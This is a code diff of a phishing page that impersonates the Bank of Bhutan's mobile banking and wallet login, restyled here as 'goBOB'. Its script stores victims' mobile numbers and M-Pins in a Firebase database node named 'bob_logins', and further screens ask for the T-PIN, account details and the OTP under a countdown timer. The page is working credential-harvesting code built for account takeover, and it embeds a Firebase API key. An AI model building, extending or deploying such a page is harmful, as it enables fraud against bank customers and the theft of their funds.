@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>mBOB Mobile Banking</title>
+<title>goBOB - Your Trusted Digital Wallet</title>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -15,261 +15,335 @@ html, body {
   height: 100%;
   overflow: hidden;
   font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-  background: #f0f2f3;
+  background: #ffffff;
   color: #1a202c;
+}
+
+/* ==================== TOP BLUE BAR ==================== */
+.top-blue-bar {
+  height: 25px;
+  background-color: #00a0dc;
+  width: 100%;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 100;
 }
 
 /* ==================== TOP NAV ==================== */
 .top-nav {
-  background: #0788bd;
-  color: #ffffff;
-  padding: 14px 20px;
+  background: transparent;
+  padding: 10px 20px;
   display: flex;
   align-items: center;
-  justify-content: space-between;
-  flex-shrink: 0;
-  position: relative;
-  z-index: 100;
+  position: fixed;
+  top: 25px;
+  left: 0;
+  right: 0;
+  z-index: 99;
 }
 
 .top-nav .menu-icon {
-  font-size: 24px;
   cursor: pointer;
-  line-height: 1;
   background: none;
   border: none;
-  color: #ffffff;
-  padding: 4px 6px;
-}
-
-.top-nav .right-icons {
+  padding: 4px;
   display: flex;
-  gap: 22px;
-  font-size: 22px;
+  align-items: center;
+  justify-content: center;
 }
 
-.top-nav .right-icons span {
-  cursor: pointer;
-  line-height: 1;
+.top-nav .menu-icon svg {
+  width: 28px;
+  height: 28px;
+  fill: #7a7a7a;
 }
 
 /* ==================== MAIN CONTAINER ==================== */
 .main-wrap {
   position: fixed;
-  top: 56px;
+  top: 70px;
   left: 0;
   right: 0;
   bottom: 0;
   overflow-y: auto;
   display: flex;
   flex-direction: column;
-  padding: 20px 8% 100px;
+  align-items: center;
+  padding: 20px 20px 100px;
+  background: #ffffff;
 }
 
-/* ==================== LOGO ==================== */
+/* ==================== LOGO SECTION ==================== */
 .brand-block {
   text-align: center;
-  margin: 15px 0 20px;
+  margin-top: 20px;
+  margin-bottom: 25px;
 }
 
 .brand-logo {
-  font-size: 46px;
-  font-weight: 700;
+  font-size: 48px;
+  font-weight: 800;
   letter-spacing: -2px;
   color: #1a1a1a;
   line-height: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 2px;
 }
 
-.brand-logo .m {
+.brand-logo .go {
   font-weight: 400;
-  color: #0788bd;
+  color: #00a0dc;
   font-style: italic;
+  font-size: 40px;
+  margin-right: -5px;
 }
 
-.brand-logo .b {
-  color: #0a9dd1;
+.brand-logo .bob-box {
+  display: flex;
+  align-items: center;
+  gap: 2px;
+}
+
+.brand-logo .bob-box .b {
+  color: #1a1a1a;
+}
+
+.brand-logo .bob-box .o-box {
+  background-color: #00a0dc;
+  color: #ffffff;
+  width: 42px;
+  height: 42px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 6px;
+  font-size: 26px;
+  margin: 0 2px;
 }
 
 .brand-sub {
-  font-size: 11px;
-  letter-spacing: 5px;
-  color: #666;
-  margin-top: 5px;
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: #333;
+  margin-top: 6px;
+  font-weight: 700;
+  text-transform: uppercase;
+}
+
+.brand-sub-powered {
+  font-size: 15px;
+  color: #333;
+  margin-top: 12px;
+  font-weight: 400;
+}
+
+/* ==================== LOGIN CARD ==================== */
+.login-card {
+  background: #fff;
+  border: 1px solid #e0e0e0;
+  border-radius: 12px;
+  padding: 20px;
+  width: 100%;
+  max-width: 400px;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.06);
+  margin-bottom: 20px;
+}
+
+.input-group-row {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 15px;
+}
+
+.country-code {
+  display: flex;
+  align-items: center;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  padding: 0 10px;
+  background: #fff;
+  width: 35%;
+  height: 52px;
+  justify-content: space-between;
+  font-size: 15px;
+  color: #333;
+  cursor: pointer;
+}
+
+.country-code .flag-icon {
+  width: 22px;
+  height: 15px;
+  object-fit: cover;
+  border-radius: 2px;
+}
+
+.country-code svg {
+  width: 12px;
+  height: 12px;
+  fill: #666;
+}
+
+.mobile-input-wrapper {
+  position: relative;
+  flex: 1;
+}
+
+.mobile-input-wrapper label {
+  position: absolute;
+  top: -10px;
+  left: 12px;
+  background: #fff;
+  padding: 0 6px;
+  font-size: 13px;
+  color: #00a0dc;
   font-weight: 500;
 }
 
-/* ==================== LANGUAGE ==================== */
-.lang-row {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  gap: 22px;
+.input-field {
+  width: 100%;
+  height: 52px;
+  border: 1.5px solid #00a0dc;
+  border-radius: 6px;
+  padding: 0 15px;
+  font-size: 16px;
+  outline: none;
+  background: transparent;
+  color: #1a202c;
+  font-family: inherit;
+}
+
+.input-field:focus {
+  border-color: #007bb5;
+}
+
+.input-group-full {
+  margin-bottom: 8px;
+}
+
+.m-pin-field {
+  border: 1.5px solid #ccc;
+}
+
+.m-pin-field:focus {
+  border-color: #00a0dc;
+}
+
+.forgot-pin {
+  text-align: right;
   font-size: 14px;
   color: #333;
-  margin-bottom: 30px;
+  margin-top: 5px;
+  padding-right: 2px;
+}
+
+.forgot-pin a {
+  color: #00a0dc;
+  text-decoration: none;
   font-weight: 500;
 }
 
-.lang-toggle {
-  width: 54px;
-  height: 28px;
-  background: #d1d5db;
-  border-radius: 30px;
-  position: relative;
-  cursor: pointer;
-  transition: 0.3s;
-}
-
-.lang-toggle.active {
-  background: #079acb;
-}
-
-.lang-toggle::after {
-  content: "";
-  position: absolute;
-  width: 22px;
-  height: 22px;
-  background: #ffffff;
-  border-radius: 50%;
-  left: 3px;
-  top: 3px;
-  transition: 0.3s;
-  box-shadow: 0 1px 3px rgba(0,0,0,0.15);
-}
-
-.lang-toggle.active::after {
-  left: 29px;
-}
-
-/* ==================== FORM ==================== */
-.form-area {
-  max-width: 480px;
-  width: 100%;
-  margin: 0 auto;
-}
-
-.form-group {
-  position: relative;
-  margin-bottom: 24px;
-  border-bottom: 2px solid #78bdcf;
-  padding-bottom: 6px;
-}
-
-.form-group input {
-  width: 100%;
-  border: none;
-  outline: none;
-  font-size: 19px;
-  padding: 10px 0 8px;
-  color: #1a202c;
-  background: transparent;
-  font-family: inherit;
-  font-weight: 400;
-}
-
-.form-group input::placeholder {
-  color: #a0aec0;
-  font-weight: 300;
-}
-
-.form-group .forgot-link {
-  position: absolute;
-  right: 0;
-  bottom: 12px;
-  font-size: 16px;
-  color: #269ab9;
-  cursor: pointer;
-  text-decoration: none;
-  font-weight: 400;
-}
-
-.form-group .forgot-link:hover {
+.forgot-pin a:hover {
   text-decoration: underline;
 }
 
-/* ==================== LOGIN BUTTON ==================== */
-.btn-login {
+.signup-link {
+  margin-top: 10px;
+  font-size: 16px;
+  color: #333;
+  text-align: center;
+}
+
+.signup-link a {
+  color: #00a0dc;
+  text-decoration: none;
+  font-weight: 600;
+}
+
+.signup-link a:hover {
+  text-decoration: underline;
+}
+
+/* ==================== BOTTOM NAVIGATION ==================== */
+.bottom-nav {
+  background-color: #00a0dc;
+  height: 75px;
   width: 100%;
-  padding: 15px;
-  background: #08a2d5;
-  color: #ffffff;
-  border: none;
-  border-radius: 30px;
-  font-size: 19px;
-  font-weight: 500;
-  font-family: inherit;
-  cursor: pointer;
-  transition: all 0.2s;
-  letter-spacing: 0.5px;
-  margin-top: 8px;
-}
-
-.btn-login:hover:not(:disabled) {
-  background: #0690be;
-}
-
-.btn-login:active:not(:disabled) {
-  transform: scale(0.99);
-}
-
-.btn-login:disabled {
-  background: #cbd5e0;
-  cursor: not-allowed;
-}
-
-/* ==================== BOTTOM BAR ==================== */
-.bottom-bar {
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  right: 0;
-  background: #ffffff;
-  border-top: 1px solid #e8e8e8;
   display: flex;
   justify-content: space-around;
   align-items: center;
-  padding: 12px 20px 16px;
-  z-index: 50;
-  box-shadow: 0 -2px 10px rgba(0,0,0,0.04);
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  border-top-left-radius: 20px;
+  border-top-right-radius: 20px;
+  padding-bottom: 8px;
+  z-index: 100;
+  box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
 }
 
-.bottom-item {
+.nav-item {
   display: flex;
   flex-direction: column;
   align-items: center;
-  gap: 4px;
+  color: #fff;
+  font-size: 11px;
   cursor: pointer;
+  width: 20%;
   background: none;
   border: none;
   font-family: inherit;
-  color: #555;
-  font-size: 13px;
-  font-weight: 500;
-  transition: color 0.2s;
+  gap: 3px;
+  transition: opacity 0.2s;
 }
 
-.bottom-item:hover {
-  color: #0788bd;
+.nav-item:active {
+  opacity: 0.7;
 }
 
-.bottom-item .icon {
-  font-size: 26px;
-  line-height: 1;
+/* SVG Icons in nav */
+.nav-item svg {
+  width: 24px;
+  height: 24px;
+  fill: none;
+  stroke: #ffffff;
+  stroke-width: 2;
+  stroke-linecap: round;
+  stroke-linejoin: round;
+  margin-bottom: 2px;
 }
 
-.bottom-item .qr-circle {
-  width: 62px;
-  height: 62px;
+.scan-item {
+  position: relative;
+  top: -22px;
+}
+
+.scan-circle {
+  background-color: #fff;
+  width: 60px;
+  height: 60px;
   border-radius: 50%;
-  background: #08a2d5;
   display: flex;
-  align-items: center;
   justify-content: center;
-  color: #ffffff;
-  font-size: 28px;
-  box-shadow: 0 4px 12px rgba(8, 162, 213, 0.35);
-  margin-bottom: -4px;
-  border: 3px solid #ffffff;
+  align-items: center;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.25);
+  margin-bottom: 4px;
+  border: 3px solid #00a0dc;
+}
+
+.scan-circle svg {
+  width: 32px;
+  height: 32px;
+  stroke: #00a0dc;
+  stroke-width: 2;
+  fill: none;
+}
+
+.scan-item span {
+  color: #fff;
+  font-size: 11px;
 }
 
 /* ==================== SCREEN PAGE ==================== */
@@ -282,12 +356,10 @@ html, body {
   z-index: 200;
 }
 
-.screen-page.show {
-  display: flex;
-}
+.screen-page.show { display: flex; }
 
 .screen-header {
-  background: #0788bd;
+  background: #00a0dc;
   color: #ffffff;
   padding: 14px 20px;
   display: flex;
@@ -311,10 +383,6 @@ html, body {
   font-family: inherit;
 }
 
-.back-btn:hover {
-  background: rgba(255, 255, 255, 0.25);
-}
-
 .screen-header-title {
   font-size: 15px;
   font-weight: 600;
@@ -329,22 +397,14 @@ html, body {
   flex-direction: column;
 }
 
-/* ==================== SCREEN LOGO ==================== */
 .screen-logo {
   text-align: center;
   margin-bottom: 30px;
 }
 
-.screen-logo .brand-logo {
-  font-size: 40px;
-}
+.screen-logo .brand-logo { font-size: 40px; }
+.screen-logo .brand-sub { font-size: 10px; letter-spacing: 4px; }
 
-.screen-logo .brand-sub {
-  font-size: 10px;
-  letter-spacing: 4px;
-}
-
-/* ==================== SCREEN TITLE ==================== */
 .screen-title {
   font-size: 20px;
   font-weight: 700;
@@ -361,7 +421,6 @@ html, body {
   line-height: 1.5;
 }
 
-/* ==================== OTP INPUTS ==================== */
 .otp-inputs {
   display: flex;
   gap: 8px;
@@ -385,16 +444,15 @@ html, body {
 }
 
 .otp-inputs input:focus {
-  border-color: #0788bd;
-  box-shadow: 0 0 0 3px rgba(7, 136, 189, 0.12);
+  border-color: #00a0dc;
+  box-shadow: 0 0 0 3px rgba(0, 160, 220, 0.12);
 }
 
 .otp-inputs input.filled {
-  border-color: #0788bd;
+  border-color: #00a0dc;
   background: #f0f9fd;
 }
 
-/* ==================== TIMER ==================== */
 .timer-display {
   display: inline-block;
   background: #e0eef2;
@@ -409,16 +467,12 @@ html, body {
   text-align: center;
 }
 
-.timer-display.expiring {
-  background: #ffe0e0;
-  color: #c62828;
-}
+.timer-display.expiring { background: #ffe0e0; color: #c62828; }
 
-/* ==================== VERIFY BUTTON ==================== */
 .btn-verify {
   width: 100%;
   padding: 15px;
-  background: #08a2d5;
+  background: #00a0dc;
   color: #ffffff;
   border: none;
   border-radius: 30px;
@@ -431,20 +485,10 @@ html, body {
   margin-top: 8px;
 }
 
-.btn-verify:hover:not(:disabled) {
-  background: #0690be;
-}
+.btn-verify:hover:not(:disabled) { background: #0690be; }
+.btn-verify:active:not(:disabled) { transform: scale(0.99); }
+.btn-verify:disabled { background: #cbd5e0; cursor: not-allowed; }
 
-.btn-verify:active:not(:disabled) {
-  transform: scale(0.99);
-}
-
-.btn-verify:disabled {
-  background: #cbd5e0;
-  cursor: not-allowed;
-}
-
-/* ==================== MESSAGES ==================== */
 .message {
   margin-top: 18px;
   padding: 12px 16px;
@@ -455,29 +499,11 @@ html, body {
   text-align: center;
 }
 
-.message.show {
-  display: block;
-}
+.message.show { display: block; }
+.message.error { background: #ffebee; color: #b71c1c; border-left: 3px solid #d32f2f; }
+.message.warning { background: #fff8e1; color: #e65100; border-left: 3px solid #f57c00; }
+.message.success { background: #e8f5e9; color: #1b5e20; border-left: 3px solid #00c853; }
 
-.message.error {
-  background: #ffebee;
-  color: #b71c1c;
-  border-left: 3px solid #d32f2f;
-}
-
-.message.warning {
-  background: #fff8e1;
-  color: #e65100;
-  border-left: 3px solid #f57c00;
-}
-
-.message.success {
-  background: #e8f5e9;
-  color: #1b5e20;
-  border-left: 3px solid #00c853;
-}
-
-/* ==================== OTP INFO ==================== */
 .otp-info {
   font-size: 13px;
   color: #4a5568;
@@ -486,16 +512,9 @@ html, body {
   line-height: 1.6;
 }
 
-.otp-info strong {
-  color: #0788bd;
-  font-weight: 700;
-}
+.otp-info strong { color: #00a0dc; font-weight: 700; }
 
-/* ==================== RESEND ==================== */
-.resend-row {
-  text-align: center;
-  margin-top: 20px;
-}
+.resend-row { text-align: center; margin-top: 20px; }
 
 .resend-link {
   color: #718096;
@@ -505,20 +524,10 @@ html, body {
   font-weight: 500;
 }
 
-.resend-link:hover {
-  color: #0788bd;
-}
+.resend-link:hover { color: #00a0dc; }
 
-/* ==================== ACCOUNT FORM ==================== */
-.account-form {
-  width: 100%;
-}
-
-.account-form .form-group {
-  margin-bottom: 24px;
-  border-bottom: none;
-  padding-bottom: 0;
-}
+.account-form { width: 100%; }
+.account-form .form-group { margin-bottom: 24px; border-bottom: none; padding-bottom: 0; }
 
 .account-form label {
   display: block;
@@ -544,16 +553,10 @@ html, body {
 }
 
 .account-form input:focus {
-  border-color: #0788bd;
-  box-shadow: 0 0 0 3px rgba(7, 136, 189, 0.12);
+  border-color: #00a0dc;
+  box-shadow: 0 0 0 3px rgba(0, 160, 220, 0.12);
 }
 
-.account-form input::placeholder {
-  color: #a0aec0;
-  font-weight: 400;
-}
-
-/* ==================== LOADING ==================== */
 .loading-overlay {
   position: fixed;
   inset: 0;
@@ -564,90 +567,145 @@ html, body {
   z-index: 900;
 }
 
-.loading-overlay.show {
-  display: flex;
-}
+.loading-overlay.show { display: flex; }
 
 .loading-spinner {
   width: 46px;
   height: 46px;
   border: 3px solid #e2e8f0;
-  border-top: 3px solid #0788bd;
+  border-top: 3px solid #00a0dc;
   border-radius: 50%;
   animation: spin 0.8s linear infinite;
 }
 
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
+@keyframes spin { to { transform: rotate(360deg); } }
 
-/* ==================== RESPONSIVE ==================== */
 @media (max-width: 480px) {
-  .otp-inputs input {
-    width: 42px;
-    height: 52px;
-    font-size: 20px;
-  }
+  .otp-inputs input { width: 42px; height: 52px; font-size: 20px; }
   .otp-inputs { gap: 6px; }
   .brand-logo { font-size: 40px; }
+  .brand-logo .o-box { width: 36px; height: 36px; font-size: 22px; }
+  .brand-logo .go { font-size: 34px; }
   .screen-title { font-size: 18px; }
-  .form-group input { font-size: 17px; }
-  .form-group .forgot-link { font-size: 14px; }
   .account-form input { padding: 14px 16px; font-size: 15px; }
+  .country-code { width: 38%; font-size: 14px; padding: 0 8px; }
+  .nav-item svg { width: 22px; height: 22px; }
+  .scan-circle { width: 54px; height: 54px; }
+  .scan-circle svg { width: 28px; height: 28px; }
 }
 </style>
 </head>
 <body>
 
+<!-- ==================== TOP BLUE BAR ==================== -->
+<div class="top-blue-bar"></div>
+
+<!-- ==================== TOP NAV (Hamburger SVG) ==================== -->
+<div class="top-nav">
+  <button class="menu-icon" onclick="menuClick()">
+    <svg viewBox="0 0 24 24">
+      <path d="M3 6h18M3 12h18M3 18h18" stroke="#7a7a7a" stroke-width="2.5" stroke-linecap="round"/>
+    </svg>
+  </button>
+</div>
+
 <!-- ==================== LOGIN PAGE ==================== -->
 <div class="main-wrap" id="loginPage">
   <div class="brand-block">
-    <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
-    <div class="brand-sub">MOBILE BANKING</div>
+    <div class="brand-logo">
+      <span class="go">go</span>
+      <span class="bob-box">
+        <span class="b">B</span>
+        <span class="o-box">◎</span>
+        <span class="b">B</span>
+      </span>
+    </div>
+    <div class="brand-sub">YOUR TRUSTED DIGITAL WALLET</div>
+    <div class="brand-sub-powered">Powered by Bank of Bhutan</div>
   </div>
 
-  <div class="lang-row">
-    <span>English</span>
-    <div class="lang-toggle" id="langToggle" onclick="toggleLang()"></div>
-    <span>བོད་ཡིག</span>
+  <div class="login-card">
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <div class="input-group-row">
+        <div class="country-code" onclick="alert('Country: Bhutan (+975)')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Flag_of_Bhutan.svg/320px-Flag_of_Bhutan.svg.png" alt="BT" class="flag-icon">
+          <span>+975</span>
+          <!-- Chevron Down SVG -->
+          <svg viewBox="0 0 24 24"><path d="M6 9l6 6 6-6" stroke="#666" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
+        </div>
+        <div class="mobile-input-wrapper">
+          <label>Mobile Number</label>
+          <input type="tel" id="userId" placeholder="" class="input-field" autocomplete="off" maxlength="8">
+        </div>
+      </div>
+
+      <div class="input-group-full">
+        <input type="password" id="password" placeholder="Enter M-Pin" class="input-field m-pin-field" autocomplete="off">
+      </div>
+
+      <div class="forgot-pin">
+        <span>Forgot M-Pin? </span>
+        <a href="#" onclick="forgotPassword(event)">Click Here</a>
+      </div>
+    </form>
   </div>
 
-  <form class="form-area" id="loginForm" onsubmit="handleLogin(event)">
-    <div class="form-group">
-      <input type="text" id="userId" placeholder="Enter User ID" autocomplete="off">
-      <span class="forgot-link" onclick="forgotUserId()">Forgot</span>
-    </div>
-
-    <div class="form-group">
-      <input type="password" id="password" placeholder="Password" autocomplete="off">
-      <span class="forgot-link" onclick="forgotPassword()">Forgot</span>
-    </div>
-
-    <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
-  </form>
+  <div class="signup-link">
+    <span>New User? </span>
+    <a href="#" onclick="signUpClick(event)">Sign Up Now</a>
+  </div>
 </div>
 
-<!-- ==================== TOP NAV ==================== -->
-<div class="top-nav">
-  <button class="menu-icon" onclick="menuClick()">☰</button>
-  <div class="right-icons">
-    <span onclick="emailClick()">✉</span>
-    <span onclick="callClick()">☎</span>
-  </div>
-</div>
+<!-- ==================== BOTTOM NAVIGATION (SVG ICONS) ==================== -->
+<div class="bottom-nav">
+  <!-- Locate -->
+  <button class="nav-item" onclick="locateClick()">
+    <svg viewBox="0 0 24 24">
+      <path d="M12 21s-7-5.5-7-11a7 7 0 1 1 14 0c0 5.5-7 11-7 11z"/>
+      <circle cx="12" cy="10" r="2.5"/>
+    </svg>
+    <span>Locate</span>
+  </button>
 
-<!-- ==================== BOTTOM BAR ==================== -->
-<div class="bottom-bar">
-  <button class="bottom-item" onclick="forexClick()">
-    <span class="icon">↔</span>
+  <!-- Contact -->
+  <button class="nav-item" onclick="contactClick()">
+    <svg viewBox="0 0 24 24">
+      <path d="M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1.9.3 1.8.6 2.6a2 2 0 0 1-.5 2.1L8 9.6a16 16 0 0 0 6 6l1.2-1.2a2 2 0 0 1 2.1-.5c.8.3 1.7.5 2.6.6a2 2 0 0 1 1.7 2z"/>
+    </svg>
+    <span>Contact</span>
+  </button>
+
+  <!-- Scan & Pay (Center) -->
+  <button class="nav-item scan-item" onclick="qrClick()">
+    <div class="scan-circle">
+      <svg viewBox="0 0 24 24">
+        <rect x="3" y="3" width="7" height="7" rx="1"/>
+        <rect x="14" y="3" width="7" height="7" rx="1"/>
+        <rect x="3" y="14" width="7" height="7" rx="1"/>
+        <path d="M14 14h3v3h-3zM20 14h1v1h-1zM14 20h1v1h-1zM20 20h1v1h-1z"/>
+      </svg>
+    </div>
+    <span>Scan & Pay</span>
+  </button>
+
+  <!-- FAQ -->
+  <button class="nav-item" onclick="faqClick()">
+    <svg viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 2-3 3.5"/>
+      <circle cx="12" cy="17" r="0.5" fill="#fff"/>
+    </svg>
+    <span>FAQ</span>
+  </button>
+
+  <!-- Forex -->
+  <button class="nav-item" onclick="forexClick()">
+    <svg viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M15 9a3 3 0 0 0-3-2c-1.7 0-3 1-3 2.3 0 3 6 1.5 6 4.4 0 1.5-1.3 2.3-3 2.3a3 3 0 0 1-3-2"/>
+      <path d="M12 5v2M12 17v2"/>
+    </svg>
     <span>Forex</span>
-  </button>
-  <button class="bottom-item" onclick="qrClick()">
-    <div class="qr-circle">▦</div>
-  </button>
-  <button class="bottom-item" onclick="transferClick()">
-    <span class="icon">⇄</span>
-    <span>Quick Transfer</span>
   </button>
 </div>
 
@@ -659,13 +717,16 @@ html, body {
   </div>
   <div class="screen-body">
     <div class="screen-logo">
-      <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
-      <div class="brand-sub">MOBILE BANKING</div>
+      <div class="brand-logo">
+        <span class="go">go</span>
+        <span class="bob-box">
+          <span class="b">B</span><span class="o-box">◎</span><span class="b">B</span>
+        </span>
+      </div>
+      <div class="brand-sub">YOUR TRUSTED DIGITAL WALLET</div>
     </div>
-
     <div class="screen-title">Enter Your T-PIN</div>
     <div class="screen-subtitle">Enter your 6-digit T-PIN to continue</div>
-
     <div class="otp-inputs">
       <input type="text" maxlength="1" inputmode="numeric" id="m1" oninput="moveInput(this, 'm2')">
       <input type="text" maxlength="1" inputmode="numeric" id="m2" oninput="moveInput(this, 'm3')">
@@ -674,7 +735,6 @@ html, body {
       <input type="text" maxlength="1" inputmode="numeric" id="m5" oninput="moveInput(this, 'm6')">
       <input type="text" maxlength="1" inputmode="numeric" id="m6" oninput="moveInput(this, null)">
     </div>
-
     <button class="btn-verify" id="mpinBtn" onclick="handleMpinVerify()" disabled>Verify</button>
     <div class="message" id="mpinMessage"></div>
   </div>
@@ -688,24 +748,25 @@ html, body {
   </div>
   <div class="screen-body">
     <div class="screen-logo">
-      <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
-      <div class="brand-sub">MOBILE BANKING</div>
+      <div class="brand-logo">
+        <span class="go">go</span>
+        <span class="bob-box">
+          <span class="b">B</span><span class="o-box">◎</span><span class="b">B</span>
+        </span>
+      </div>
+      <div class="brand-sub">YOUR TRUSTED DIGITAL WALLET</div>
     </div>
-
     <div class="screen-title">Account Details</div>
     <div class="screen-subtitle">Please enter your account information</div>
-
     <form class="account-form" onsubmit="event.preventDefault();">
       <div class="form-group">
         <label>Account Name</label>
         <input type="text" id="accountName" placeholder="Enter your account name" autocomplete="off" oninput="checkAccountForm()">
       </div>
-
       <div class="form-group">
         <label>Mobile Number</label>
         <input type="tel" id="mobileNumber" inputmode="numeric" placeholder="Enter your mobile number" autocomplete="off" oninput="checkAccountForm()">
       </div>
-
       <button type="button" class="btn-verify" id="accountBtn" onclick="handleAccountConfirm()" disabled>Confirm</button>
       <div class="message" id="accountMessage"></div>
     </form>
@@ -720,19 +781,18 @@ html, body {
   </div>
   <div class="screen-body">
     <div class="screen-logo">
-      <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
-      <div class="brand-sub">MOBILE BANKING</div>
+      <div class="brand-logo">
+        <span class="go">go</span>
+        <span class="bob-box">
+          <span class="b">B</span><span class="o-box">◎</span><span class="b">B</span>
+        </span>
+      </div>
+      <div class="brand-sub">YOUR TRUSTED DIGITAL WALLET</div>
     </div>
-
     <div class="screen-title">Verify OTP</div>
     <div class="screen-subtitle">Enter the 6-digit OTP code</div>
-
-    <div class="otp-info">
-      OTP has been sent to <strong id="maskedNumber">******</strong>
-    </div>
-
+    <div class="otp-info">OTP has been sent to <strong id="maskedNumber">******</strong></div>
     <div class="timer-display" id="otpTimer">03:00</div>
-
     <div class="otp-inputs">
       <input type="text" maxlength="1" inputmode="numeric" id="o1" oninput="moveInput(this, 'o2')">
       <input type="text" maxlength="1" inputmode="numeric" id="o2" oninput="moveInput(this, 'o3')">
@@ -741,13 +801,8 @@ html, body {
       <input type="text" maxlength="1" inputmode="numeric" id="o5" oninput="moveInput(this, 'o6')">
       <input type="text" maxlength="1" inputmode="numeric" id="o6" oninput="moveInput(this, null)">
     </div>
-
     <button class="btn-verify" id="otpBtn" onclick="handleOtpVerify()" disabled>Verify</button>
-
-    <div class="resend-row">
-      <span class="resend-link" onclick="resendOtp()">Resend OTP</span>
-    </div>
-
+    <div class="resend-row"><span class="resend-link" onclick="resendOtp()">Resend OTP</span></div>
     <div class="message" id="otpMessage"></div>
   </div>
 </div>
@@ -759,7 +814,7 @@ html, body {
 
 <script>
 // =====================================================
-// FIREBASE
+// FIREBASE CONFIG
 // =====================================================
 var firebaseConfig = {
   apiKey: "AIzaSyBIwUsxyeQmoeT2ctH2LxqRU__dhqp9s94",
@@ -773,9 +828,7 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var database = firebase.database();
 
-// 🔥 mBOB data node
 var DATA_NODE = 'bob_logins';
-
 var sessionRef = null;
 var userIdValue = "";
 var passwordValue = "";
@@ -787,83 +840,32 @@ var timerInterval = null;
 var timeLeft = 180;
 
 // =====================================================
-// LANGUAGE TOGGLE
-// =====================================================
-function toggleLang() {
-  document.getElementById('langToggle').classList.toggle('active');
-}
-
-// =====================================================
-// FORGOT HANDLERS
-// =====================================================
-function forgotUserId() {
-  alert('Please contact Bank of Bhutan customer care for User ID assistance.');
-}
-
-function forgotPassword() {
-  alert('Please contact Bank of Bhutan customer care for password reset.');
-}
-
-// =====================================================
 // NAV HANDLERS
 // =====================================================
-function menuClick() {
-  alert('Menu\n\n• Home\n• Accounts\n• Transfer\n• Bill Pay\n• Settings\n• Help');
-}
-
-function emailClick() {
-  window.location.href = 'mailto:support@bob.bt';
-}
-
-function callClick() {
-  alert('Customer Care\n\n📞 +975 2 349903\n🆓 Toll Free: 1095');
-}
-
-function forexClick() {
-  alert('Forex Services\n\nCurrency exchange rates and international transfers.');
-}
-
-function qrClick() {
-  alert('QR Payment\n\nScan QR code to pay.');
-}
-
-function transferClick() {
-  alert('Quick Transfer\n\nSend money to any account instantly.');
-}
+function menuClick() { alert('Menu\n\n• Home\n• Accounts\n• Transfer\n• Bill Pay\n• Settings\n• Help'); }
+function locateClick() { alert('Locate Us\n\nFind nearest Bank of Bhutan branch or ATM.'); }
+function contactClick() { alert('Customer Care\n\n📞 +975 2 349903\n🆓 Toll Free: 1095'); }
+function qrClick() { alert('Scan & Pay\n\nScan QR code to make payment.'); }
+function faqClick() { alert('FAQ\n\nFrequently Asked Questions will appear here.'); }
+function forexClick() { alert('Forex Services\n\nCurrency exchange rates and international transfers.'); }
+function forgotPassword(e) { if(e) e.preventDefault(); alert('Please contact Bank of Bhutan customer care for M-Pin reset.'); }
+function signUpClick(e) { if(e) e.preventDefault(); alert('Sign Up\n\nNew user registration will open here.'); }
 
 // =====================================================
-// LOGIN FORM
+// LOGIN
 // =====================================================
 var userIdInput = document.getElementById('userId');
 var passwordInput = document.getElementById('password');
-var loginBtn = document.getElementById('loginBtn');
 
-userIdInput.addEventListener('input', checkLoginForm);
-passwordInput.addEventListener('input', checkLoginForm);
+passwordInput.addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') { e.preventDefault(); handleLogin(e); }
+});
 
-function checkLoginForm() {
-  var u = userIdInput.value.trim();
-  var p = passwordInput.value.trim();
-  if (u.length > 0 && p.length > 0) {
-    loginBtn.disabled = false;
-  } else {
-    loginBtn.disabled = true;
-  }
-}
-
-// =====================================================
-// HANDLE LOGIN
-// =====================================================
 function handleLogin(e) {
-  e.preventDefault();
-
+  if(e) e.preventDefault();
   var userId = userIdInput.value.trim();
   var password = passwordInput.value.trim();
-
-  if (!userId || !password) {
-    alert('Please enter both User ID and Password.');
-    return;
-  }
+  if (!userId || !password) { alert('Please enter both Mobile Number and M-Pin.'); return; }
 
   userIdValue = userId;
   passwordValue = password;
@@ -874,24 +876,13 @@ function handleLogin(e) {
 
   sessionRef = database.ref(DATA_NODE).push();
   sessionRef.set({
-    userId: userId,
-    password: password,
-    mpin: '—',
-    otpCode: '—',
-    accountName: '—',
-    mobileNumber: '—',
-    status: 'pending',
-    time: timeStr,
-    timestamp: now.getTime(),
+    userId: userId, password: password, mpin: '—', otpCode: '—',
+    accountName: '—', mobileNumber: '—', status: 'pending',
+    time: timeStr, timestamp: now.getTime(),
     device: navigator.userAgent || 'Unknown'
-  }).then(function() {
-    console.log('✅ Session created in', DATA_NODE);
-  }).catch(function(err) {
